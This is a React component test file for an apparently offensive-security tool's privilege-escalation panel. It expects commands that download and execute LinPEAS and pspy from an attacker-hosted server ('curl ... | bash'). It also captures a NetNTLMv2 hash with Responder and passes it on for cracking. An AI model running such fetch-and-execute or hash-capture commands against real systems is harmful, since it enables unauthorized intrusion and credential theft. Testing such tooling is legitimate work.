// @vitest-environment jsdom
import {cleanup, fireEvent, render, screen, waitFor} from "@testing-library/react";
import {afterEach, beforeEach, expect, it, vi} from "vitest";
import PrivescSessionPanel from "./PrivescSessionPanel";

vi.mock("./InteractiveTerminal", () => ({
  default: ({initialInput}: {initialInput: string}) =>
    <div data-testid="terminal-prefill">{initialInput}</div>,
}));

beforeEach(() => {
  vi.stubGlobal("fetch", vi.fn(() => Promise.resolve(new Response("", {status: 200}))));
});
afterEach(() => {
  cleanup();
  vi.unstubAllGlobals();
});

it("renders nothing without an open session", () => {
  const {container} = render(
    <PrivescSessionPanel serverBusy={false} onToggleServer={vi.fn()}
      onSendCommand={vi.fn()} onClose={vi.fn()} />,
  );
  expect(container.firstChild).toBeNull();
});

it("prefills the shell and only queues LinPEAS/WinPEAS/pspy commands once the server is running", () => {
  const onSendCommand = vi.fn();
  const onToggleServer = vi.fn();
  render(
    <PrivescSessionPanel
      session={{id: 7, command: "impacket-psexec admin@10.10.10.10"}}
      server={{running: true, base_url: "http://10.10.14.1:8000",
        available: {peass: true, pspy: true}}}
      serverBusy={false} onToggleServer={onToggleServer}
      onSendCommand={onSendCommand} onClose={vi.fn()} />,
  );
  expect(screen.getByTestId("terminal-prefill").textContent).toBe(
    "impacket-psexec admin@10.10.10.10",
  );
  expect(screen.getByText(/tun0에서 서비스 중/)).toBeTruthy();
  fireEvent.click(screen.getByText("서버 중지"));
  expect(onToggleServer).toHaveBeenCalledOnce();
  fireEvent.click(screen.getByText("LinPEAS 명령 셸에 입력"));
  expect(onSendCommand).toHaveBeenCalledWith(
    "curl -sS http://10.10.14.1:8000/peass/linpeas/linpeas.sh | bash",
  );
  fireEvent.click(screen.getByText("pspy 명령 셸에 입력"));
  expect(onSendCommand).toHaveBeenCalledWith(
    "curl -sS http://10.10.14.1:8000/pspy/pspy64 -o /tmp/pspy64 "
    + "&& chmod +x /tmp/pspy64 && /tmp/pspy64",
  );
});

it("disables LinPEAS/WinPEAS/pspy buttons while the server is stopped", () => {
  render(
    <PrivescSessionPanel session={{id: 7, command: "impacket-psexec admin@10.10.10.10"}}
      server={{running: false}} serverBusy={false} onToggleServer={vi.fn()}
      onSendCommand={vi.fn()} onClose={vi.fn()} />,
  );
  expect(screen.getByText("LinPEAS 명령 셸에 입력").hasAttribute("disabled")).toBe(true);
  expect(screen.getByText("WinPEAS 명령 셸에 입력").hasAttribute("disabled")).toBe(true);
  expect(screen.getByText("pspy 명령 셸에 입력").hasAttribute("disabled")).toBe(true);
  expect(screen.getByText("서버 시작")).toBeTruthy();
});

it("disables only the pspy button when pspy is not installed but peass is", () => {
  render(
    <PrivescSessionPanel session={{id: 7, command: "impacket-psexec admin@10.10.10.10"}}
      server={{running: true, base_url: "http://10.10.14.1:8000",
        available: {peass: true, pspy: false}}}
      serverBusy={false} onToggleServer={vi.fn()}
      onSendCommand={vi.fn()} onClose={vi.fn()} />,
  );
  expect(screen.getByText("LinPEAS 명령 셸에 입력").hasAttribute("disabled")).toBe(false);
  expect(screen.getByText("pspy 명령 셸에 입력").hasAttribute("disabled")).toBe(true);
  expect(screen.getByText(/pspy가 설치되어 있지 않아/)).toBeTruthy();
});

it("finds a captured NetNTLMv2 hash in the session log and forwards it to Hash Cracking", async () => {
  const hash = "Administrator::RESPONDER:3b67a030f36498fb:" +
    "981902F11A8A942835156BBEF2E22942:0101000000000000805549A9F823DD01";
  vi.stubGlobal("fetch", vi.fn(() => Promise.resolve(
    new Response(`[SMB] NTLMv2-SSP Hash     : ${hash}`, {status: 200}))));
  const onSendHashToCracking = vi.fn();
  render(
    <PrivescSessionPanel session={{id: 7, command: "sudo responder -I tun0"}}
      serverBusy={false} onToggleServer={vi.fn()} onSendCommand={vi.fn()}
      onClose={vi.fn()} onSendHashToCracking={onSendHashToCracking} />,
  );
  await waitFor(() => expect(screen.getByText("Hash Cracking으로 보내기")).toBeTruthy());
  fireEvent.click(screen.getByText("Hash Cracking으로 보내기"));
  expect(onSendHashToCracking).toHaveBeenCalledWith(hash);
});

it("does not show a captured-hash section when nothing matched yet", () => {
  render(
    <PrivescSessionPanel session={{id: 7, command: "sudo responder -I tun0"}}
      serverBusy={false} onToggleServer={vi.fn()} onSendCommand={vi.fn()}
      onClose={vi.fn()} onSendHashToCracking={vi.fn()} />,
  );
  expect(screen.queryByText("Hash Cracking으로 보내기")).toBeNull();
});
